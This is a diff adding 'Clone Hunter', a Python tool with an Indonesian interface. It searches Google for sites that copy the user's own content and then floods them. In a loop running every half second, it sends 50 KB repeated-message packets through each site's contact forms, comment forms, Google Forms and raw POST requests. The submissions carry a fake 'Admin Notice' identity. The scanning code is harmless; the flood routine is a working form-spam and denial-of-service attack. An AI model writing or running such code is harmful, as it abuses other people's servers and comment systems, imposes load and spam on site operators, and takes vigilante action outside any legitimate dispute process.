@@ -1,0 +1,646 @@
+# hunter.py
+# Clone Hunter by MR414N-ID
+# Python 3.10+
+# pip install requests beautifulsoup4 dnspython openpyxl
+
+import re
+import os
+import sys
+import json
+import time
+import signal
+import hashlib
+import socket
+import random
+import string
+import threading
+import concurrent.futures
+from dataclasses import dataclass, field, asdict
+from datetime import datetime
+from urllib.parse import urlparse, urljoin
+
+import requests
+import dns.resolver
+from bs4 import BeautifulSoup
+from openpyxl import Workbook, load_workbook
+from openpyxl.styles import Font, PatternFill, Alignment
+
+# ─── banner ───────────────────────────────────────────────────────────────────
+
+BANNER = r"""
+        _.---._
+      .'       '.
+     /   O   O   \
+    |      >      |
+     \    ~~~    /
+      '.       .'
+        '-----'
+     ~~~~~~~~~~~~~
+
+  ███╗   ███╗██████╗ ██╗  ██╗██╗██╗  ██╗███╗   ██╗      ██╗██████╗ 
+  ████╗ ████║██╔══██╗██║  ██║██║██║  ██║████╗  ██║     ██╔╝██╔══██╗
+  ██╔████╔██║██████╔╝███████║██║███████║██╔██╗ ██║    ██╔╝ ██║  ██║
+  ██║╚██╔╝██║██╔══██╗╚════██║╚═╝╚════██║██║╚██╗██║   ██╔╝  ██║  ██║
+  ██║ ╚═╝ ██║██║  ██║     ██║       ██║██║ ╚████║  ██╔╝   ██████╔╝
+  ╚═╝     ╚═╝╚═╝  ╚═╝     ╚═╝       ╚═╝╚═╝  ╚═══╝  ╚═╝    ╚═════╝ 
+
+              [ Clone Hunter ]
+              by MR414N-ID
+"""
+
+# ─── config ───────────────────────────────────────────────────────────────────
+
+UA          = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36"
+TIMEOUT     = 10
+PACKET_SIZE = 50 * 1024   # 50 KB
+XLSX_FILE   = "findings.xlsx"
+DEFAULT_MSG = "Hai kamu jangan lancang mencuri data orang lain"
+
+FIELD_CANDIDATES = {
+    "name":    ["name", "nama", "your_name", "full_name", "contact_name", "sender"],
+    "email":   ["email", "your_email", "contact_email", "mail"],
+    "message": ["message", "pesan", "msg", "body", "content", "comment",
+                "komentar", "text", "description", "query"],
+    "subject": ["subject", "subjek", "title", "judul"],
+}
+DUMMY_NAME    = "Admin Notice"
+DUMMY_EMAIL   = "notice@notice.local"
+DUMMY_SUBJECT = "Peringatan Konten"
+
+# ─── global stop flag ─────────────────────────────────────────────────────────
+
+_stop = threading.Event()
+
+def _handle_sigint(sig, frame):
+    print("\n\n[*] Ctrl+C diterima — menghentikan pengiriman...")
+    _stop.set()
+
+signal.signal(signal.SIGINT, _handle_sigint)
+
+# ─── data ─────────────────────────────────────────────────────────────────────
+
+@dataclass
+class Finding:
+    url: str
+    score: int        = 0
+    similarity: float = 0.0
+    server_ip: str    = ""
+    asn: str          = ""
+    title: str        = ""
+    matches: list     = field(default_factory=list)
+    sent_form: int    = 0
+    sent_raw: int     = 0
+    sent_comment: int = 0
+    sent_gform: int   = 0
+    last_sent: str    = ""
+
+# ─── helpers ──────────────────────────────────────────────────────────────────
+
+def fetch(url: str, data=None, headers_extra=None) -> tuple[str, str, int]:
+    h = {"User-Agent": UA}
+    if headers_extra:
+        h.update(headers_extra)
+    try:
+        if data:
+            r = requests.post(url, data=data, headers=h, timeout=TIMEOUT, allow_redirects=True)
+        else:
+            r = requests.get(url, headers=h, timeout=TIMEOUT, allow_redirects=True)
+        return r.text, r.url, r.status_code
+    except Exception as e:
+        return "", "", 0
+
+def resolve_ip(host: str) -> str:
+    try:
+        return socket.gethostbyname(host)
+    except Exception:
+        return ""
+
+def asn_lookup(ip: str) -> str:
+    try:
+        rev = ".".join(reversed(ip.split("."))) + ".origin.asn.cymru.com"
+        ans = dns.resolver.resolve(rev, "TXT", lifetime=5)
+        return str(ans[0]).split("|")[0].strip().strip('"')
+    except Exception:
+        return ""
+
+def normalize(html: str) -> str:
+    soup = BeautifulSoup(html, "html.parser")
+    for t in soup(["script", "style", "noscript"]):
+        t.decompose()
+    return re.sub(r"\s+", " ", soup.get_text(" ")).strip()
+
+def shingle_similarity(a: str, b: str, k: int = 3) -> float:
+    def shingles(s):
+        w = s.split()
+        return {tuple(w[i:i+k]) for i in range(len(w) - k + 1)}
+    sa, sb = shingles(a), shingles(b)
+    if not sa or not sb:
+        return 0.0
+    return len(sa & sb) / len(sa | sb)
+
+def content_hash(html: str) -> str:
+    return hashlib.sha256(normalize(html).encode()).hexdigest()
+
+def make_packet(message: str) -> str:
+    """Ulang pesan sampai 50 KB."""
+    base  = message + "\n"
+    reps  = (PACKET_SIZE // len(base.encode())) + 1
+    return (base * reps)[:PACKET_SIZE]
+
+# ─── Google scrape untuk cari clone ───────────────────────────────────────────
+
+def extract_unique_phrases(text: str, n: int = 3) -> list[str]:
+    sentences = re.split(r'[.!?]\s+', text)
+    sentences = [s.strip() for s in sentences if len(s.strip()) > 40]
+    random.shuffle(sentences)
+    return sentences[:n]
+
+def google_search_urls(query: str) -> list[str]:
+    """Scrape Google Search untuk dapat URL hasil."""
+    search_url = f"https://www.google.com/search?q={requests.utils.quote(query)}&num=20"
+    html, _, status = fetch(search_url, headers_extra={"Accept-Language": "id-ID,id;q=0.9"})
+    if not html:
+        return []
+    soup  = BeautifulSoup(html, "html.parser")
+    urls  = []
+    for a in soup.find_all("a", href=True):
+        href = a["href"]
+        m    = re.search(r'/url\?q=([^&]+)', href)
+        if m:
+            u = requests.utils.unquote(m.group(1))
+            if u.startswith("http"):
+                urls.append(u)
+    return list(dict.fromkeys(urls))  # dedupe
+
+def find_clones_auto(baseline_url: str) -> list[Finding]:
+    print(f"\n[*] Mengambil konten situs kamu: {baseline_url}")
+    baseline_html, _, _ = fetch(baseline_url)
+    if not baseline_html:
+        print("[!] Gagal fetch situs kamu.")
+        return []
+
+    baseline_text = normalize(baseline_html)
+    baseline_domain = urlparse(baseline_url).netloc
+
+    phrases = extract_unique_phrases(baseline_text)
+    if not phrases:
+        print("[!] Tidak ada kalimat unik ditemukan.")
+        return []
+
+    print(f"[*] {len(phrases)} kalimat unik ditemukan. Mencari clone di Google...")
+
+    candidate_urls = []
+    for phrase in phrases:
+        query = f'"{phrase[:80]}" -site:{baseline_domain}'
+        urls  = google_search_urls(query)
+        candidate_urls.extend(urls)
+        time.sleep(2)  # hindari block Google
+
+    candidate_urls = list(dict.fromkeys(candidate_urls))
+    candidate_urls = [u for u in candidate_urls
+                      if baseline_domain not in urlparse(u).netloc]
+
+    print(f"[*] {len(candidate_urls)} URL kandidat ditemukan. Memulai scan...")
+
+    findings = []
+    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as pool:
+        futures = {
+            pool.submit(analyze_url, u, baseline_html, baseline_text): u
+            for u in candidate_urls
+        }
+        for fut in concurrent.futures.as_completed(futures):
+            try:
+                r = fut.result()
+                if r:
+                    findings.append(r)
+                    print(f"  [+] Clone: {r.url}  score={r.score}  sim={r.similarity:.2f}")
+            except Exception:
+                pass
+
+    return findings
+
+def find_clones_from_file(filepath: str, baseline_url: str) -> list[Finding]:
+    baseline_html, _, _ = fetch(baseline_url)
+    if not baseline_html:
+        print("[!] Gagal fetch situs kamu.")
+        return []
+    baseline_text = normalize(baseline_html)
+
+    with open(filepath) as fh:
+        targets = [ln.strip() for ln in fh if ln.strip() and not ln.startswith("#")]
+
+    print(f"[*] {len(targets)} target dari file. Memulai scan...")
+    findings = []
+    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as pool:
+        futures = {
+            pool.submit(analyze_url, u, baseline_html, baseline_text): u
+            for u in targets
+        }
+        for fut in concurrent.futures.as_completed(futures):
+            try:
+                r = fut.result()
+                if r:
+                    findings.append(r)
+                    print(f"  [+] Clone: {r.url}  score={r.score}  sim={r.similarity:.2f}")
+            except Exception:
+                pass
+    return findings
+
+def analyze_url(url: str, baseline_html: str, baseline_text: str) -> Finding | None:
+    html, final_url, _ = fetch(url)
+    if not html:
+        return None
+
+    f    = Finding(url=final_url or url)
+    host = urlparse(final_url or url).hostname or ""
+    f.server_ip = resolve_ip(host)
+
+    sim = shingle_similarity(baseline_text, normalize(html))
+    f.similarity = round(sim, 3)
+    if sim > 0.4:
+        f.score += int(sim * 50)
+        f.matches.append(f"shingle:{sim:.2f}")
+
+    if content_hash(html) == content_hash(baseline_html):
+        f.score += 60
+        f.matches.append("exact-content")
+
+    soup       = BeautifulSoup(html, "html.parser")
+    your_soup  = BeautifulSoup(baseline_html, "html.parser")
+    f.title    = (soup.title.string if soup.title else "").strip()
+    your_title = (your_soup.title.string if your_soup.title else "").strip()
+    if your_title and f.title == your_title:
+        f.score += 15
+        f.matches.append("title-match")
+
+    return f if f.score >= 20 else None
+
+# ─── form detection ───────────────────────────────────────────────────────────
+
+def find_forms(html: str, base_url: str) -> list[dict]:
+    soup  = BeautifulSoup(html, "html.parser")
+    forms = []
+    for form in soup.find_all("form"):
+        action = form.get("action", "") or base_url
+        if action.startswith("/"):
+            p      = urlparse(base_url)
+            action = f"{p.scheme}://{p.netloc}{action}"
+        elif not action.startswith("http"):
+            action = base_url.rstrip("/") + "/" + action
+        method = form.get("method", "post").lower()
+        fields = {}
+        for inp in form.find_all(["input", "textarea", "select"]):
+            fname = inp.get("name", "")
+            if not fname:
+                continue
+            ftype = inp.get("type", "text").lower()
+            if ftype in ("submit", "button", "image", "reset"):
+                continue
+            fields[fname] = inp.get("value", "")
+        forms.append({"action": action, "method": method, "fields": fields})
+    return forms
+
+def fill_form(fields: dict, message: str) -> dict:
+    filled    = dict(fields)
+    fname_low = {k.lower(): k for k in fields}
+    for role, candidates in FIELD_CANDIDATES.items():
+        for cand in candidates:
+            if cand in fname_low:
+                key = fname_low[cand]
+                if role == "message": filled[key] = message
+                elif role == "name":  filled[key] = DUMMY_NAME
+                elif role == "email": filled[key] = DUMMY_EMAIL
+                elif role == "subject": filled[key] = DUMMY_SUBJECT
+                break
+    return filled
+
+def find_google_forms(html: str) -> list[str]:
+    return re.findall(r'https://docs\.google\.com/forms/d/[^\s"\'<>]+', html)
+
+def find_comment_endpoints(html: str, base_url: str) -> list[dict]:
+    """Cari form komentar spesifik (WordPress wp-comments-post, dll)."""
+    forms   = find_forms(html, base_url)
+    comment = []
+    for f in forms:
+        action = f["action"].lower()
+        fields_lower = {k.lower() for k in f["fields"]}
+        if ("comment" in action or "komentar" in action or
+                any(c in fields_lower for c in ["comment", "komentar"])):
+            comment.append(f)
+    return comment
+
+# ─── send channels ────────────────────────────────────────────────────────────
+
+def send_via_form(url: str, packet: str) -> bool:
+    html, _, _ = fetch(url)
+    if not html:
+        return False
+    forms = find_forms(html, url)
+    best  = None
+    for form in forms:
+        fl = {k.lower() for k in form["fields"]}
+        if any(c in fl for c in FIELD_CANDIDATES["message"]):
+            best = form
+            break
+    if not best and forms:
+        best = forms[0]
+    if not best:
+        return False
+    filled = fill_form(best["fields"], packet)
+    action = best["action"]
+    method = best["method"]
+    if method == "get":
+        _, _, status = fetch(action + "?" + "&".join(f"{k}={v}" for k, v in filled.items()))
+    else:
+        _, _, status = fetch(action, data=filled,
+                             headers_extra={"Content-Type": "application/x-www-form-urlencoded",
+                                            "Referer": url})
+    return status in (200, 201, 302)
+
+def send_raw_post(url: str, packet: str) -> bool:
+    parsed = urlparse(url)
+    target = f"{parsed.scheme}://{parsed.netloc}/"
+    _, _, status = fetch(target, data=packet.encode(),
+                         headers_extra={"Content-Type": "text/plain",
+                                        "Content-Length": str(len(packet.encode()))})
+    return status in (200, 201, 302, 400, 403, 404, 405)  # server merespon = paket diterima
+
+def send_via_comment(url: str, packet: str) -> bool:
+    html, _, _ = fetch(url)
+    if not html:
+        return False
+    comment_forms = find_comment_endpoints(html, url)
+    if not comment_forms:
+        return False
+    form   = comment_forms[0]
+    filled = fill_form(form["fields"], packet)
+    _, _, status = fetch(form["action"], data=filled,
+                         headers_extra={"Content-Type": "application/x-www-form-urlencoded",
+                                        "Referer": url})
+    return status in (200, 201, 302)
+
+def send_via_gform(url: str, packet: str) -> bool:
+    html, _, _ = fetch(url)
+    if not html:
+        return False
+    gforms = find_google_forms(html)
+    if not gforms:
+        return False
+    gform_url = gforms[0]
+    # ambil field entry Google Form
+    ghtml, _, _ = fetch(gform_url)
+    if not ghtml:
+        return False
+    entries = re.findall(r'entry\.(\d+)', ghtml)
+    if not entries:
+        return False
+    submit_url = gform_url.replace("/viewform", "/formResponse")
+    data = {f"entry.{e}": packet[:500] for e in entries[:3]}
+    _, _, status = fetch(submit_url, data=data,
+                         headers_extra={"Referer": gform_url})
+    return status in (200, 201, 302)
+
+# ─── flood loop ───────────────────────────────────────────────────────────────
+
+def flood_target(finding: Finding, message: str, xlsx_path: str):
+    """Kirim terus ke 4 channel sampai _stop di-set."""
+    packet  = make_packet(message)
+    counter = 0
+    print(f"\n[*] Memulai flood ke: {finding.url}")
+    print(f"    Tekan Ctrl+C untuk berhenti.\n")
+
+    try:
+        while not _stop.is_set():
+            counter += 1
+            ts = datetime.now().strftime("%H:%M:%S")
+
+            r_form    = send_via_form(finding.url, packet)
+            r_raw     = send_raw_post(finding.url, packet)
+            r_comment = send_via_comment(finding.url, packet)
+            r_gform   = send_via_gform(finding.url, packet)
+
+            if r_form:    finding.sent_form    += 1
+            if r_raw:     finding.sent_raw     += 1
+            if r_comment: finding.sent_comment += 1
+            if r_gform:   finding.sent_gform   += 1
+            finding.last_sent = datetime.now().strftime("%d/%m %H:%M")
+
+            status_line = (
+                f"  [#{counter}] {ts} | "
+                f"form={'✅' if r_form else '❌'} "
+                f"raw={'✅' if r_raw else '❌'} "
+                f"comment={'✅' if r_comment else '❌'} "
+                f"gform={'✅' if r_gform else '❌'}"
+            )
+            print(status_line)
+            update_xlsx([finding], xlsx_path)
+            time.sleep(0.5)
+
+    except Exception as e:
+        print(f"[!] Error: {e}")
+
+    total = finding.sent_form + finding.sent_raw + finding.sent_comment + finding.sent_gform
+    print(f"\n[*] Selesai. Total paket terkirim: {total} ke {finding.url}")
+
+# ─── xlsx ─────────────────────────────────────────────────────────────────────
+
+HEADERS = [
+    "No", "URL Clone", "Score", "Similarity", "IP Server",
+    "Judul", "Form", "Raw POST", "Komentar", "GForm",
+    "Total Paket", "Terakhir Kirim"
+]
+
+def init_xlsx(path: str):
+    wb = Workbook()
+    ws = wb.active
+    ws.title = "Findings"
+    header_fill = PatternFill("solid", fgColor="1F4E79")
+    header_font = Font(bold=True, color="FFFFFF")
+    for col, h in enumerate(HEADERS, 1):
+        cell            = ws.cell(row=1, column=col, value=h)
+        cell.fill       = header_fill
+        cell.font       = header_font
+        cell.alignment  = Alignment(horizontal="center")
+    ws.column_dimensions["B"].width = 45
+    ws.column_dimensions["F"].width = 30
+    wb.save(path)
+
+def update_xlsx(findings: list[Finding], path: str):
+    if not os.path.exists(path):
+        init_xlsx(path)
+    wb = load_workbook(path)
+    ws = wb.active
+
+    existing = {}
+    for row in ws.iter_rows(min_row=2, values_only=False):
+        url_cell = row[1].value
+        if url_cell:
+            existing[url_cell] = row[0].row
+
+    for f in findings:
+        total = f.sent_form + f.sent_raw + f.sent_comment + f.sent_gform
+        row_data = [
+            None,  # No — isi setelah
+            f.url, f.score, f.similarity, f.server_ip,
+            f.title,
+            f.sent_form, f.sent_raw, f.sent_comment, f.sent_gform,
+            total, f.last_sent
+        ]
+        if f.url in existing:
+            r = existing[f.url]
+            for col, val in enumerate(row_data[1:], 2):
+                ws.cell(row=r, column=col, value=val)
+        else:
+            next_row = ws.max_row + 1
+            row_data[0] = next_row - 1
+            for col, val in enumerate(row_data, 1):
+                ws.cell(row=next_row, column=col, value=val)
+
+    wb.save(path)
+
+# ─── menu ─────────────────────────────────────────────────────────────────────
+
+def prompt(label: str, default: str = "") -> str:
+    suffix = f" [{default}]" if default else ""
+    val    = input(f"  {label}{suffix}: ").strip()
+    return val if val else default
+
+def menu_scan_auto():
+    baseline = prompt("URL situs kamu")
+    if not baseline:
+        print("[!] URL wajib diisi.")
+        return
+    findings = find_clones_auto(baseline)
+    if not findings:
+        print("\n[*] Tidak ada clone ditemukan.")
+        return
+    print(f"\n[+] {len(findings)} clone ditemukan:")
+    for i, f in enumerate(findings, 1):
+        print(f"  [{i}] {f.url}  score={f.score}  sim={f.similarity}")
+    update_xlsx(findings, XLSX_FILE)
+    print(f"\n[*] Disimpan ke {XLSX_FILE}")
+
+def menu_scan_file():
+    baseline = prompt("URL situs kamu")
+    filepath = prompt("File target (.txt)")
+    if not baseline or not filepath:
+        print("[!] Semua field wajib diisi.")
+        return
+    findings = find_clones_from_file(filepath, baseline)
+    if not findings:
+        print("\n[*] Tidak ada clone ditemukan.")
+        return
+    print(f"\n[+] {len(findings)} clone ditemukan:")
+    for i, f in enumerate(findings, 1):
+        print(f"  [{i}] {f.url}  score={f.score}  sim={f.similarity}")
+    update_xlsx(findings, XLSX_FILE)
+    print(f"\n[*] Disimpan ke {XLSX_FILE}")
+
+def menu_send():
+    if not os.path.exists(XLSX_FILE):
+        print(f"[!] {XLSX_FILE} tidak ditemukan. Jalankan scan dulu.")
+        return
+
+    wb       = load_workbook(XLSX_FILE)
+    ws       = wb.active
+    findings = []
+    for row in ws.iter_rows(min_row=2, values_only=True):
+        if row[1]:
+            f = Finding(
+                url        = str(row[1]),
+                score      = row[2] or 0,
+                similarity = row[3] or 0.0,
+                server_ip  = row[4] or "",
+                title      = row[5] or "",
+                sent_form  = row[6] or 0,
+                sent_raw   = row[7] or 0,
+                sent_comment = row[8] or 0,
+                sent_gform = row[9] or 0,
+                last_sent  = row[11] or "",
+            )
+            findings.append(f)
+
+    if not findings:
+        print("[!] Tidak ada data di findings.xlsx")
+        return
+
+    print(f"\n[*] {len(findings)} clone di findings.xlsx:")
+    for i, f in enumerate(findings, 1):
+        print(f"  [{i}] {f.url}")
+
+    idx_input = prompt("Pilih nomor clone (Enter = semua)", "semua")
+    if idx_input.lower() == "semua":
+        targets = findings
+    else:
+        try:
+            idx     = int(idx_input) - 1
+            targets = [findings[idx]]
+        except Exception:
+            print("[!] Input tidak valid.")
+            return
+
+    message = prompt("Pesan (Enter = default)", DEFAULT_MSG)
+
+    _stop.clear()
+    for target in targets:
+        if _stop.is_set():
+            break
+        flood_target(target, message, XLSX_FILE)
+
+def menu_full():
+    baseline = prompt("URL situs kamu")
+    if not baseline:
+        print("[!] URL wajib diisi.")
+        return
+
+    findings = find_clones_auto(baseline)
+    if not findings:
+        print("\n[*] Tidak ada clone ditemukan.")
+        return
+
+    print(f"\n[+] {len(findings)} clone ditemukan:")
+    for i, f in enumerate(findings, 1):
+        print(f"  [{i}] {f.url}  score={f.score}  sim={f.similarity}")
+
+    update_xlsx(findings, XLSX_FILE)
+
+    lanjut = input("\n  Kirim pesan ke semua clone? (y/n): ").strip().lower()
+    if lanjut != "y":
+        return
+
+    message = prompt("Pesan (Enter = default)", DEFAULT_MSG)
+    _stop.clear()
+    for target in findings:
+        if _stop.is_set():
+            break
+        flood_target(target, message, XLSX_FILE)
+
+# ─── main ─────────────────────────────────────────────────────────────────────
+
+def main():
+    os.system("cls" if os.name == "nt" else "clear")
+    print(BANNER)
+
+    while True:
+        print("\n" + "─" * 50)
+        print("  [1] Cari clone otomatis (Google)")
+        print("  [2] Scan dari file list")
+        print("  [3] Kirim pesan ke findings.xlsx")
+        print("  [4] Scan + Kirim sekaligus")
+        print("  [0] Keluar")
+        print("─" * 50)
+
+        pilih = input("  Pilih: ").strip()
+
+        if   pilih == "1": menu_scan_auto()
+        elif pilih == "2": menu_scan_file()
+        elif pilih == "3": menu_send()
+        elif pilih == "4": menu_full()
+        elif pilih == "0":
+            print("\n  bye.\n")
+            sys.exit(0)
+        else:
+            print("  [!] Pilihan tidak valid.")
+
+if __name__ == "__main__":
+    main()
